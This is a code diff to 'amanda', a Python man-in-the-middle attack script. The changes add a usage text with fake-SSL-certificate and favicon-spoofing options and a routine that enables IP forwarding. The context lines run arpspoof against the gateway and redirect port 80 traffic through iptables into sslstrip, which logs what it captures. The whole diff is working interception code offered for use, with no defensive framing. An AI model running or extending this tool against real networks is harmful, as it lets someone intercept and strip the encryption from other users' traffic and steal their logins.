@@ -11,6 +11,20 @@ term='xterm -geometry 30x5'
 menu="""
 q - Quit
 """
+usage="""
+You are running amanda [Nexzei Edition]
+
+usage : amanda -h -f -s -t [TARGET] -o [DIRECTORY]
+  -h or --help  : Display this help message, disclaimer and exit
+  -f or --fav  : Do not use a padlock favicon in sslstrip.
+  -o or --output : Output folder
+  -s or --ssl : Fake SSL certificates
+"""
+
+def reroute4(val):
+  f=open('/proc/sys/net/ipv4/ip_forward',"w")
+  f.write(val)
+  f.close()
 
 def getifgate():
   p=x("route -n")
@@ -26,12 +40,12 @@ def setup(port=8100):
   x("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + str(port))
 
 def clean():
-  f=open('/proc/sys/net/ipv4/ip_forward',"w")
-  f.write("0")
-  f.close()
+  reroute4("0")
   x("iptables --flush")
+  x("iptables --delete-chain")
   for p in ps.values():
     p.kill()
+  print("Cleanup Successesfull!")
 
 #try:
 if True:
@@ -41,6 +55,7 @@ if True:
   print ("  --- Amanda 0.1 by Nexzei ---\n")
   print ("Targeting %s at %s via port %s" % (gate, iface, port))
   print ("Saving to %s" % dr)
+  reroute4("1")
   ps['ssls']=x('%s -e "ssls -k -l %d -w %s"' % (term, port, dr+"ssls.log"))
   ps['arp']=x('%s -e "arpspoof -i %s %s"' % (term, iface, gate))
   i = None
